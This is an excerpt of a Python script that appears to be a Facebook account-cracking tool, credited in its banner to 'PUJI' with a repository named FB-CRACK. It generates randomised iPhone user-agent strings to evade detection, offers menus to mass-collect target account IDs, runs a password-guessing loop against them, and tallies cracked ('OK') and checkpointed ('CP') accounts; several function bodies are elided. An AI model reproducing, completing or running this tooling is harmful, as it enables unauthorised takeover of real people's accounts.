...
for tu in range(10000):
	...
	luci=f"Mozilla/5.0 (iPhone; CPU iPhone OS {a}_{a} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(5,20))}.8 Mobile/{str(rr(43,150))} DuckDuckGo/7 Safari/605.1.15"
	luci1=f'Mozilla/5.0 (iPhone; CPU iPhone OS {a}_{a} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(5,20))}.0 YaBrowser/{str(rr(43,150))}.0.{str(rr(3200,4999))}.{str(rr(73,150))} SA/3 Mobile/15E148 Safari/604.1'
	puji3 =f'Mozilla/5.0 (iPhone; CPU iPhone OS {a}_{a} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/{str(rr(5,20))}.1.{str(rr(43,150))} Mobile/15E148 Safari/604.1'
	uaku1=rc([luci,luci1,puji3])
	ugen.append(uaku1)
...
def banner():
      ...
      print(f'''{hijo}                         
███████╗██╗  ██╗██╗██╗██╗ {hijo}GACOR GA GACOR LAH
╚══███╔╝██║  ██║██║██║██║ {hijo}AUTHOR  :PUJI
  ███╔╝ ███████║██║██║██║   {kun}GITHUB : https://github.com/pujikaelem/FB-CRACK.git
 ███╔╝  ██╔══██║██║██║██║    {mer}
███████╗██║  ██║██║██║██║{Z}
╚══════╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                                                                                                                                                                                                                                                                                                                                                ''')
#kukis
...
def menu():
	...
	try:
		...
		print(f'\n{P} [:] cookie lu error kontol ganti yang baru.{P}')
	...
	try:
		...
		login3()
		banner()
	prints(panel(f"""[white][[cyan]1[white]] crack id publik [[green]  ON[white]] \n[[cyan]2[white]] Crack Massal [green][[green] ON [white]] \n[[cyan]3[white]] CEK HASIL CP [[green] ON [white]]\n[[cyan]4[white]] CEK HASIL OK [white][[green] ON [white]] [[cyan]5[white]] logout [white][\n[red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green]  𝕻𝖀𝕵𝖎 [/]]",style=f"bold white"))
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	CYXIEON_GANTENG = input(f'{kun}└──[{puti} id target mu : ')
...
def dump_massal():
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] puji [/]]",style=f"bold white"))
	...
	for user in uid:
	    try:
	      ...
	      pass
	        ...
	        exit()
	try:
	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]puji[/]]",style=f"bold white"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
...
def atur_method():
	print("")
	print(f'{kun}->[{biru}01. VALIDATE  ') 
	print(f'{kun}->[{biru}02. VALIDATEv2 ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r {emot}(Zhii)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
